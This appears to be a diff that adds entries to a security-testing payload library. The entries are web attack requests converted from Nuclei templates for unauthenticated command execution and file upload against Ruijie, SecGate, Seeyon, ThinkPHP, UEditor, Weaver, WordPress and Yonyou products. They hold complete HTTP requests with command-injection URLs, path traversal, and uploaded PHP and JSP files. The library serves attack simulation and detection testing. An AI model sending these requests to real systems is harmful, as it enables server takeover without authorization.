+    "payload_description": "[Nuclei ruijie-nmc-sync-rce by DhiyaneshDk] There is a command execution vulnerability in the nmc_sync.php interface of Ruijie's RG-UAC unified online behavior management and audit system. An unauthenticated attacker can execute arbitrary commands to control server permissions.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|echo+{{md5(random_str)}}+>+{{rand_base(6)}}.txt|cat",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "SecGate 3600 Firewall obj_app_upfile - Arbitrary File Upload (Nuclei: secgate-3600-file-upload)",
+    "payload_external_id": "B8-UPLOAD-099",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei secgate-3600-file-upload by SleepingBag945] There is an arbitrary file upload vulnerability in the obj_app_upfile interface of Internet SecGate 3600 firewall. An attacker can obtain server permissions by constructing a special request package.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/?g=obj_app_upfile",
+    "web_request_headers": [
+      {
+        "name": "Accept",
+        "value": "*/*"
+      },
+      {
+        "name": "Accept-Encoding",
+        "value": "gzip, deflate"
+      },
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundarysecgate-3600-file-upload"
+      },
+      {
+        "name": "User-Agent",
+        "value": "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundarysecgate-3600-file-upload\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n10000000\n------WebKitFormBoundarysecgate-3600-file-upload\nContent-Disposition: form-data; name=\"upfile\"; filename=\"{{rand_base(6)}}.php\"\nContent-Type: text/plain\n\n<?php echo md5(\"secgate-3600-file-upload\");unlink(__FILE__);?>\n\n------WebKitFormBoundarysecgate-3600-file-upload\nContent-Disposition: form-data; name=\"submit_post\"\n\nobj_app_upfile\n------WebKitFormBoundarysecgate-3600-file-upload\nContent-Disposition: form-data; name=\"__hash__\"\n\n0b9d6b1ab7479ab69d9f71b05e0e9445\n------WebKitFormBoundarysecgate-3600-file-upload--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": "\\{\\{md5\\(string\\)\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Seeyon OA wpsAssistServlet - Arbitrary File Upload (Nuclei: seeyon-oa-sp2-file-upload)",
+    "payload_external_id": "B8-UPLOAD-100",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei seeyon-oa-sp2-file-upload by SleepingBag945] There is an arbitrary file upload vulnerability in the Seeyon OA wpsAssistServlet interface. Through the vulnerability, an attacker can send a specific request packet to upload malicious files and obtain server permissions.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{rand_base(6)}}.jsp&fileId=2",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b"
+      },
+      {
+        "name": "Accept-Encoding",
+        "value": "gzip"
+      }
+    ],
+    "web_request_body": "--59229605f98b8cf290a7b8908b34616b\nContent-Disposition: form-data; name=\"upload\"; filename=\"{{rand_base(6)}}.xls\"\nContent-Type: application/vnd.ms-excel\n\n<% out.println(\"{{rand_base(5)}}\");%>\n--59229605f98b8cf290a7b8908b34616b--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "ThinkPHP 6.0.0~6.0.1 - Arbitrary File Write (Nuclei: thinkphp6-arbitrary-write)",
+    "payload_external_id": "B8-UPLOAD-101",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei thinkphp6-arbitrary-write by arliya] ThinkPHP 6.0.0~6.0.1 is susceptible to remote code execution. An attacker can upload any script file through this vulnerability to realize remote code execution takeover.We inject payload into PHPSESSID. In the buggy version, the payload is url encoded and returned as it is. In the fixed version,...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/",
+    "web_request_headers": [
+      {
+        "name": "Cookie",
+        "value": "PHPSESSID=/../../../public/{{to_lower(rand_base(11))}}.php"
+      },
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "",
+    "web_request_body_type": "form",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "UEditor - PHP Arbitrary File Upload (Nuclei: ueditor-arbitrary-file-upload)",
+    "payload_external_id": "B8-UPLOAD-102",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei ueditor-arbitrary-file-upload by ChiragArtani] Detects arbitrary file upload vulnerability in UEditor PHP  by attempting to upload and execute a PHP file. This vulnerability allows remote attackers to upload arbitrary files including PHP files, potentially leading to remote code execution.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/{{rand_base(5)}}&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]={{rand_base(5)}}",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundaryDMmqvK6b3ncX4xxA\nContent-Disposition: form-data; name=\"{{rand_base(5)}}\"; filename=\"{{rand_base(5)}}.php\"\nContent-Type: application/octet-stream\n\n<?php\nphpinfo();\n?>\n------WebKitFormBoundaryDMmqvK6b3ncX4xxA--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Wanhu OA smartUpload.jsp - Arbitrary File Upload (Nuclei: wanhuoa-smartupload-file-upload)",
+    "payload_external_id": "B8-UPLOAD-103",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei wanhuoa-smartupload-file-upload by SleepingBag945] Wanhu OA smartUpload.jsp file has a file upload interface and does not filter file types, resulting in arbitrary file upload vulnerabilities. Malicious JSP files can be uploaded directly.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "请选择要上传的文件|<TITLE>上传附件</TITLE>"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Weaver E-Office v9.5 - Arbitrary File Upload (Nuclei: weaver-eoffice-file-upload)",
+    "payload_external_id": "B8-UPLOAD-104",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei weaver-eoffice-file-upload by princechaddha] Weaver E-Office version 9.5 is susceptible to an arbitrary file upload vulnerability. This flaw allows malicious actors to upload and execute arbitrary code or files without proper validation or authorization.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save",
+    "web_request_headers": [
+      {
+        "name": "Origin",
+        "value": "{{BaseURL}}"
+      },
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\nContent-Disposition: form-data; name=\"upload_quwan\"; filename=\"{{rand_base(7, \"abc\")}}.phP\"\nContent-Type: image/jpeg\n\n{{randstr}}\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\nContent-Disposition: form-data; name=\"file\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "OA E-Office LazyUploadify - Arbitrary File Upload (Nuclei: weaver-lazyuploadify-file-upload)",
+    "payload_external_id": "B8-UPLOAD-105",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei weaver-lazyuploadify-file-upload by SleepingBag945] OA E-Office LazyUploadify is vulnerable to arbitrary file upload.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/general/weibo/javascript/LazyUploadify/uploadify.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress Plugin Gallery 3.06 - Arbitrary File Upload (Nuclei: wp-gallery-file-upload)",
+    "payload_external_id": "B8-UPLOAD-106",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei wp-gallery-file-upload by r3Y3r53] The Gallery by BestWebSoft WordPress plugin was affected by an Unauthenticated File Upload PHP Code Execution security vulnerability.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-content/plugins/gallery-plugin/upload/php.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=WebKitFormBoundary20kgW2hEKYaeF5iP"
+      }
+    ],
+    "web_request_body": "--WebKitFormBoundary20kgW2hEKYaeF5iP\nContent-Disposition: form-data; name=\"qqfile\"; filename=\"{{to_lower(rand_text_alpha(5))}}.png\"\n\n{{randstr}}\n\n--WebKitFormBoundary20kgW2hEKYaeF5iP--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Yonyou NC FileReceiveServlet - Aribitrary File Upload (Nuclei: yonyou-filereceiveservlet-fileupload)",
+    "payload_external_id": "B8-UPLOAD-107",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei yonyou-filereceiveservlet-fileupload by bjxsec] An unauthorized attacker can upload a file via the FileReceiveServlet endpoint.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/servlet/FileReceiveServlet",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data;"
+      }
+    ],
+    "web_request_body": "{{hex_decode(\"ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C7708000000100000000274000946494C455F4E414D45740009\")}}{{to_upper(rand_text_alphanumeric(5))}}.jsp{{hex_decode(\"7400105441524745545F46494C455F504154487400102E2F776562617070732F6E635F77656278\")}}{{randstr}}",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "UFIDA U8-CRM getemaildata - Arbitary File Upload (Nuclei: yonyou-u8-crm-fileupload)",
+    "payload_external_id": "B8-UPLOAD-108",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei yonyou-u8-crm-fileupload by SleepingBag945,pussycat0x] There is an arbitrary file upload vulnerability in the getemaildata.php file of UFIDA U8 CRM customer relationship management system. An attacker can obtain server permissions through the vulnerability and attack the server.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/ajax/getemaildata.php?DontCheckLogin=1",
+    "web_request_headers": [
+      {
+        "name": "Content-Length",
+        "value": "300"
+      },
+      {
+        "name": "Cache-Control",
+        "value": "max-age=0"
+      },
+      {
+        "name": "Accept",
+        "value": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+      },
+      {
+        "name": "Origin",
+        "value": "null"
+      },
+      {
+        "name": "Upgrade-Insecure-Requests",
+        "value": "1"
+      },
+      {
+        "name": "User-Agent",
+        "value": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
+      },
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundaryAVuAKsvesmnWtgEP"
+      },
+      {
+        "name": "Accept-Encoding",
+        "value": "gzip, deflate"
+      },
+      {
+        "name": "Accept-Language",
+        "value": "zh-CN,zh;q=0.8"
+      },
+      {
+        "name": "Cookie",
+        "value": "PHPSESSID=ibru7pqnplhi720caq0ev8uvt0"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundaryAVuAKsvesmnWtgEP\nContent-Disposition: form-data; name=\"file\"; filename=\"%s.php \"\nContent-Type: application/octet-stream\n\n{{randstr}}\n------WebKitFormBoundaryAVuAKsvesmnWtgEP\nContent-Disposition: form-data; name=\"upload\"\n\nupload\n------WebKitFormBoundaryAVuAKsvesmnWtgEP--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Yonyou U9 PatchFile.asmx - Unauthenticated Arbitrary File Upload (Nuclei: yonyou-u9-patchfile-upload)",
+    "payload_external_id": "B8-UPLOAD-109",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei yonyou-u9-patchfile-upload by Co5mos,ProjectDiscoveryAI] An arbitrary file upload vulnerability in U9 PatchFile.asmx allows attackers to upload files to the server.This can lead to various security issues including remote code execution.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/CS/Office/AutoUpdates/{{rand_base(5)}}.ashx",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  }
+]
